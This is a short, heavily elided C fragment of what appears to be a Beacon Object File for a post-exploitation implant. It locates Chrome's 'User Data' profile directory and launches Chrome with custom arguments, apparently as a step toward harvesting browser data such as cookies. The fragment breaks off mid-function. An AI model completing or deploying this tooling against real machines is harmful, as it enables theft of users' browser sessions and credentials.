...
VOID WINAPI BofMain( PBAPI_TABLE BeaconApi, PVOID Argv, INT Argc ) 
{
    ...
    CHAR            chromeArgs[MAX_PATH * 2] = { 0 };
    CHAR            appdataDir[MAX_PATH ] = { 0 };
    CHAR            tempDir[MAX_PATH] = { 0 };
    FILETIME        fileTime;
    ULARGE_INTEGER  time;

    Api.SHGetFolderPathA( NULL, CSIDL_PROGRAM_FILES, NULL, 0, chromePath );
    ...
    strcatA( userDataPath, "\\Google\\Chrome\\User Data" );
    ...
    proc = Api.CreateProcessA( chromePath, chromeArgs, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo );
    if( proc == FALSE )
    {
